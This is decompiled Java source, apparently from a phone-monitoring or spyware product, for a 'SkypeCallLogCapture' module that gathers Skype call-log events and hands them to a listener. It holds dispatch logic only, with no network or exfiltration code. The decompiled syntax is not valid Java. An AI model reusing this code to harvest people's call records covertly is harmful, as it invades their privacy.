package com.vvt.capture.e.c.a;

import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
  implements com.vvt.base.capture.a
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private e d;
  private f e;
  
  public a(String paramString1, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, String paramString2)
  {
    this.c = paramString1;
    this.b = parama;
    Object localObject = RunningMode.FULL;
    boolean bool;
    if (paramRunningMode == localObject)
    {
      bool = a;
      if (bool) {}
      localObject = new com/vvt/capture/e/c/a/a/a/a;
      ((com.vvt.capture.e.c.a.a.a.a)localObject).<init>();
      ((com.vvt.capture.e.c.a.a.a.a)localObject).a(this);
      this.d = ((e)localObject);
      localObject = new com/vvt/capture/e/c/a/a/a/b;
      ((com.vvt.capture.e.c.a.a.a.b)localObject).<init>();
      this.e = ((f)localObject);
    }
    for (;;)
    {
      return;
      localObject = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject)
      {
        bool = a;
        if (bool) {}
        localObject = new com/vvt/capture/e/c/a/a/b/a;
        String str = this.c;
        ((com.vvt.capture.e.c.a.a.b.a)localObject).<init>(paramb, str, paramString2);
        ((com.vvt.capture.e.c.a.a.b.a)localObject).a(this);
        this.d = ((e)localObject);
        localObject = new com/vvt/capture/e/c/a/a/b/b;
        str = this.c;
        ((com.vvt.capture.e.c.a.a.b.b)localObject).<init>(str, paramString2);
        this.e = ((f)localObject);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.e;
    bool = localObject instanceof com.vvt.capture.e.c.a.a.a.b;
    if (bool)
    {
      localObject = (com.vvt.capture.e.c.a.a.a.b)this.e;
      ((com.vvt.capture.e.c.a.a.a.b)localObject).b();
    }
    for (;;)
    {
      i();
      bool = a;
      if (bool) {}
      return;
      localObject = this.e;
      bool = localObject instanceof com.vvt.capture.e.c.a.a.b.b;
      if (bool)
      {
        localObject = (com.vvt.capture.e.c.a.a.b.b)this.e;
        ((com.vvt.capture.e.c.a.a.b.b)localObject).b();
      }
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool3 = localObject instanceof com.vvt.capture.e.a.a;
        if (bool3)
        {
          localObject = b.a((com.vvt.capture.e.a.a)localObject);
          localArrayList.add(localObject);
        }
      }
      Object localObject = this.b;
      if (localObject != null)
      {
        int i = localArrayList.size();
        if (i > 0)
        {
          boolean bool2 = k();
          if (bool2)
          {
            localObject = this.b;
            ((com.vvt.base.a)localObject).a(localArrayList);
          }
        }
      }
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "SkypeCallLogCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "skype_calllog.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/MyUncaughtExceptionHandler/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */